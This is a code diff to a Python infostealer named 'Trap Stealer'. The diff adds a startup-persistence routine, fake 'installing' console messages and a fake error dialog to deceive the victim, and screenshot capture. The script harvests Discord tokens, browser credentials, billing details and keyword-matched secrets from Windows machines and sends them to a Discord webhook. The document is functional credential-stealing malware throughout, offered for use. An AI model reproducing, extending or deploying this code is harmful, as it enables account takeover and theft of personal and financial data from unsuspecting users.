@@ -16,13 +16,22 @@ from zipfile import ZipFile
 import random
 import re
 import subprocess
-import json, socket, win32crypt, getpass
+import json, socket, win32crypt, getpass, ctypes
+from PIL import ImageGrab
 
 
-webhook = ''
 
+### CONFIG ### 
+shitty_message = True # If True it will print fake message, if you want to disable it replace with False
+fakeerror = True # If True it will make an fake error message at the end
+webhook = '' #Put ur webhook
+if shitty_message == True:
+    print('Importing Module...')
+else:
+    pass
 file_path = os.path.realpath(__file__)
 USER_NAME = getpass.getuser()
+
 
 def add_to_startup(py_file_path=file_path, bat_file_path=None):
     if not bat_file_path:
@@ -48,6 +57,9 @@ def add_to_startup(py_file_path=file_path, bat_file_path=None):
         f.write(contents)
 
 add_to_startup()
+
+
+
 
 def LoadUrlib(hook, data='', files='', headers=''):
     for i in range(8):
@@ -131,6 +143,8 @@ desktop_path = os.path.join(home_dir, 'Desktop')
 downloads_path = os.path.join(home_dir, 'Downloads')
 
 Threadlist = []
+
+# Discord Badge
 badgeList =  [
         {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<:developer:874750808472825986> "},
         {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<:bughunter_2:874750808430874664> "},
@@ -143,6 +157,8 @@ badgeList =  [
         {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "<:partner:874750808678354964> "},
         {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<:staff:874750808728666152> "}
     ]
+
+
 from ctypes import *
 from Crypto.Cipher import AES
 
@@ -170,8 +186,10 @@ def CryptUnprotectData(encrypted_bytes, entropy=b''):
 
     if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
         return GetData(blob_out)
-
-
+if shitty_message == True:
+    print('Adding Requests...')
+else:
+    pass
 def DecryptValue(buff, master_key=None):
     starts = buff.decode(encoding='utf8', errors='ignore')[:3]
     if starts == 'v10' or starts == 'v11':
@@ -185,18 +203,6 @@ def DecryptValue(buff, master_key=None):
 
 
 def GetUHQFriends(token):
-    badgeList =  [
-        {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<:developer:874750808472825986> "},
-        {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<:bughunter_2:874750808430874664> "},
-        {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early_supporter:874750808414113823> "},
-        {"Name": 'House_Balance', 'Value': 256, 'Emoji': "<:balance:874750808267292683> "},
-        {"Name": 'House_Brilliance', 'Value': 128, 'Emoji': "<:brilliance:874750808338608199> "},
-        {"Name": 'House_Bravery', 'Value': 64, 'Emoji': "<:bravery:874750808388952075> "},
-        {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "<:bughunter_1:874750808426692658> "},
-        {"Name": 'HypeSquad_Events', 'Value': 4, 'Emoji': "<:hypesquad_events:874750808594477056> "},
-        {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "<:partner:874750808678354964> "},
-        {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<:staff:874750808728666152> "}
-    ]
     headers = {
         "Authorization": token,
         "Content-Type": "application/json",
@@ -220,6 +226,52 @@ def GetUHQFriends(token):
             uhqlist += f"{OwnedBadges} - {friend['user']['username']}#{friend['user']['discriminator']} | ID : ({friend['user']['id']})\n"
     return uhqlist
 
+
+
+def GetBadge(flags):
+    if flags == 0: return ''
+
+    OwnedBadges = ''
+    for badge in badgeList:
+        if flags // badge["Value"] != 0:
+            OwnedBadges += badge["Emoji"]
+            flags = flags % badge["Value"]
+    return OwnedBadges
+
+def GetTokenInfo(token):
+    headers = {
+        "Authorization": token,
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
+    }
+
+    UserInfo = loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers)).read().decode())
+
+    # Account information
+    username = UserInfo["username"];hashtag = UserInfo["discriminator"];email = UserInfo["email"];id = UserInfo["id"];pfp = UserInfo["avatar"];flags = UserInfo["public_flags"];nitro = "";phone = "-";
+
+    if "premium_type" in UserInfo: 
+        nitros = UserInfo["premium_type"]
+        if nitros == 1:
+            nitro = "<:classic:896119171019067423> "
+        elif nitros == 2:
+            nitro = "<a:boost:824036778570416129> <:classic:896119171019067423> "
+    if "phone" in UserInfo:
+        phone = f'`{UserInfo["phone"]}`'
+
+    return username, hashtag, email, id, pfp, flags, nitro, phone
+
+def checkToken(token):
+    headers = {
+        "Authorization": token,
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
+    }
+    try:
+        urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers))
+        return True
+    except:
+        return False
 
 def GetBilling(token):
     headers = {
@@ -247,82 +299,6 @@ def GetBilling(token):
     return billing
 
 
-
-def GetBadge(flags):
-    if flags == 0: return ''
-
-    OwnedBadges = ''
-
-    for badge in badgeList:
-        if flags // badge["Value"] != 0:
-            OwnedBadges += badge["Emoji"]
-            flags = flags % badge["Value"]
-
-    return OwnedBadges
-
-def GetTokenInfo(token):
-    headers = {
-        "Authorization": token,
-        "Content-Type": "application/json",
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
-    }
-
-    UserInfo = loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers)).read().decode())
-    username = UserInfo["username"]
-    hashtag = UserInfo["discriminator"]
-    email = UserInfo["email"]
-    idd = UserInfo["id"]
-    pfp = UserInfo["avatar"]
-    flags = UserInfo["public_flags"]
-    nitro = ""
-    phone = "-"
-
-    if "premium_type" in UserInfo: 
-        nitros = UserInfo["premium_type"]
-        if nitros == 1:
-            nitro = "<:classic:896119171019067423> "
-        elif nitros == 2:
-            nitro = "<a:boost:824036778570416129> <:classic:896119171019067423> "
-    if "phone" in UserInfo:
-        phone = f'`{UserInfo["phone"]}`'
-
-    return username, hashtag, email, idd, pfp, flags, nitro, phone
-
-def checkToken(token):
-    headers = {
-        "Authorization": token,
-        "Content-Type": "application/json",
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
-    }
-    try:
-        urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers))
-        return True
-    except:
-        return False
-
-
-browser_path = [
-    [f"{roaming}/Opera Software/Opera GX Stable", "opera.exe", "/Local Storage/leveldb", "/", "/Network", "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],
-    [f"{roaming}/Opera Software/Opera Stable", "opera.exe", "/Local Storage/leveldb", "/", "/Network", "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],
-    [f"{roaming}/Opera Software/Opera Neon/User Data/Default", "opera.exe", "/Local Storage/leveldb", "/", "/Network", "/Local Extension Settings/nkbihfbeogaeaoehlefnknn"],
-    [f"{local}/Google/Chrome/User Data", "chrome.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],
-    [f"{local}/Google/Chrome SxS/User Data", "chrome.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],
-    [f"{local}/BraveSoftware/Brave-Browser/User Data", "brave.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],
-    [f"{local}/Yandex/YandexBrowser/User Data", "yandex.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn"],
-    [f"{local}/Microsoft/Edge/User Data", "edge.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],
-    [f"{roaming}/Mozilla/Firefox/Profiles", "firefox.exe", "/storage/default", "/", "/networkCache", "/chrome/ididnkmllhcdpgnbehfkhbgmfigibfnh/Local Storage"],
-    [f"{local}/Vivaldi/User Data", "vivaldi.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],
-    [f"{local}/BraveSoftware/Brave-Browser-Beta/User Data", "brave.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],
-    [f"{local}/BraveSoftware/Brave-Browser-Nightly/User Data", "brave.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],
-    [f"{local}/Chromium/User Data", "chrome.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],
-
-]
-discord_paths = [
-    [f"{roaming}/Discord", "/Local Storage/leveldb"],
-    [f"{roaming}/Lightcord", "/Local Storage/leveldb"],
-    [f"{roaming}/discordcanary", "/Local Storage/leveldb"],
-    [f"{roaming}/discordptb", "/Local Storage/leveldb"]
-]
 
 def uploadToken(token, path):
     headers = {
@@ -397,7 +373,22 @@ def uploadToken(token, path):
     LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
 
 
-    
+Tokens = ''
+def getToken(path, arg):
+    if not os.path.exists(path): return
+
+    path += arg
+    for file in os.listdir(path):
+        if file.endswith(".log") or file.endswith(".ldb")   :
+            for line in [x.strip() for x in open(f"{path}\\{file}", errors="ignore").readlines() if x.strip()]:
+                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", r"mfa\.[\w-]{80,95}"):
+                    for token in re.findall(regex, line):
+                        global Tokens
+                        if checkToken(token):
+                            if not token in Tokens:
+                                Tokens += token
+                                uploadToken(token, path)
+
 def GetDiscord(path, arg):
     if not os.path.exists(f"{path}/Local State"): return
 
@@ -406,7 +397,8 @@ def GetDiscord(path, arg):
     pathKey = path + "/Local State"
     with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
     master_key = b64decode(local_state['os_crypt']['encrypted_key'])
-    master_key = CryptUnprotectData(master_key[5:])    
+    master_key = CryptUnprotectData(master_key[5:])
+    
     for file in os.listdir(pathC):
         if file.endswith(".log") or file.endswith(".ldb")   :
             for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines() if x.strip()]:
@@ -419,34 +411,44 @@ def GetDiscord(path, arg):
                             uploadToken(tokenDecoded, path)
 
 
+if shitty_message == True:
+    print('Everything Installed...')
+else:
+    pass
+def GatherAll():
+    '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >                          Extentions < 5 >                                  '
+    browserPaths = [
+        [f"{roaming}/Opera Software/Opera GX Stable", "opera.exe", "/Local Storage/leveldb", "/", "/Network", "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],
+        [f"{roaming}/Opera Software/Opera Stable", "opera.exe", "/Local Storage/leveldb", "/", "/Network", "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],
+        [f"{roaming}/Opera Software/Opera Neon/User Data/Default", "opera.exe", "/Local Storage/leveldb", "/", "/Network", "/Local Extension Settings/nkbihfbeogaeaoehlefnknn"],
+        [f"{local}/Google/Chrome/User Data", "chrome.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],
+        [f"{local}/Google/Chrome SxS/User Data", "chrome.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],
+        [f"{local}/BraveSoftware/Brave-Browser/User Data", "brave.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],
+        [f"{local}/Yandex/YandexBrowser/User Data", "yandex.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn"],
+        [f"{local}/Microsoft/Edge/User Data", "edge.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],
+        [f"{roaming}/Mozilla/Firefox/Profiles", "firefox.exe", "/storage/default", "/", "/networkCache", "/chrome/ididnkmllhcdpgnbehfkhbgmfigibfnh/Local Storage"],
+        [f"{local}/Vivaldi/User Data", "vivaldi.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],
+        [f"{local}/BraveSoftware/Brave-Browser-Beta/User Data", "brave.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],
+        [f"{local}/BraveSoftware/Brave-Browser-Nightly/User Data", "brave.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],
+        [f"{local}/Chromium/User Data", "chrome.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],
+    ]
 
+    discordPaths = [
+        [f"{roaming}/Discord", "/Local Storage/leveldb"],
+        [f"{roaming}/Lightcord", "/Local Storage/leveldb"],
+        [f"{roaming}/discordcanary", "/Local Storage/leveldb"],
+        [f"{roaming}/discordptb", "/Local Storage/leveldb"],
+    ]
 
-Tokens = ''
-def get_tokens(path, arg):
-    if not os.path.exists(path):
-        return
-
-    path += arg
-    for file in os.listdir(path):
-        if file.endswith((".log", ".ldb")):
-            with open(os.path.join(path, file), errors="ignore") as f:
-                for line in f:
-                    line = line.strip()
-                    if line:
-                        for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", r"mfa\.[\w-]{80,95}"):
-                            token = re.search(regex, line)
-                            if token and checkToken(token.group()):
-                                if token.group() not in Tokens:
-                                    Tokens += token.group()
-                                    uploadToken(token.group(), path)
-
-for paths in discord_paths: 
-        a = threading.Thread(target=GetDiscord, args=[paths[0], paths[1]])
+    for patt in browserPaths: 
+        a = threading.Thread(target=getToken, args=[patt[0], patt[2]])
+        a.start()
+    for patt in discordPaths: 
+        a = threading.Thread(target=GetDiscord, args=[patt[0], patt[1]])
         a.start()
 
-for paths in browser_path: 
-        a = threading.Thread(target=GetDiscord, args=[paths[0], paths[2]])
-        a.start()
+GatherAll()
+
 
 data = {
     "username": "Trap Stealer",
@@ -474,9 +476,6 @@ headers = {
     }
 
 LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
-
-
-
 
 
 keywords = ["password", "mot_de_passe", "mdp", "motdepasse", "token", "key", "secret", "secrett", "api", "account", "login", "username", "email", "phone", "credit card", "social security number", "address", "birthdate", "security question", "PIN", "passport", "driver's license", "national ID", "bank account", "routing number", "financial information", "transaction", "balance", "wire transfer", "cryptocurrency", "bitcoin", "ethereum", "wallet", "private key", "public key"]
@@ -541,3 +540,78 @@ if urls:
 
 LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
 
+user = os.path.expanduser("~")
+
+def screen():
+
+    img = ImageGrab.grab()
+    img_path = os.path.join(user, "AppData", "Local", "Temp", "ss.png")
+    img.save(img_path)
+
+    data = {
+        "username": "Trap Stealer",
+        "content": "",
+        "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
+        "embeds": [
+            {
+                "title": "🍪 Trap Stealer Screen",
+                "description": f"Screen taken at : {time.strftime('%Y-%m-%d %H:%M:%S')}\n",
+                "color": 0xffb6c1,
+                "thumbnail": {
+                    "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
+                },
+                "footer": {
+                    "text": "Trap Stealer | https://github.com/TheCuteOwl",
+                    "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
+                }
+            }
+        ]
+    }
+
+    response = requests.post(webhook, json=data)
+    file = {"file": open(img_path, "rb")}
+    data = {
+        "username": "Trap Stealer",
+        "content": "",
+        "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png"
+    }
+    response = requests.post(webhook, files=file, data=data)
+    try:
+        os.remove(img_path)
+    except:
+        pass
+if shitty_message == True:
+    print('Starting..')
+else:
+    pass
+try:
+    screen()
+except:
+    headers = {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
+    }
+    data = {
+        "username": "Trap Stealer",
+        "content": "",
+        "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
+        "embeds": [
+            {
+                "title": "🍪 Trap Stealer Screen",
+                "description": f"Cannot take any screen\n",
+                "color": 0xffb6c1,
+                "thumbnail": {
+                    "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
+                },
+                "footer": {
+                    "text": "Trap Stealer | https://github.com/TheCuteOwl",
+                    "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
+                }
+            }
+        ]
+    }
+    LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
+
+if fakeerror == True:
+    ctypes.windll.user32.MessageBoxW(0, "Error, Restart...", "Retry!", 16)
+else:pass
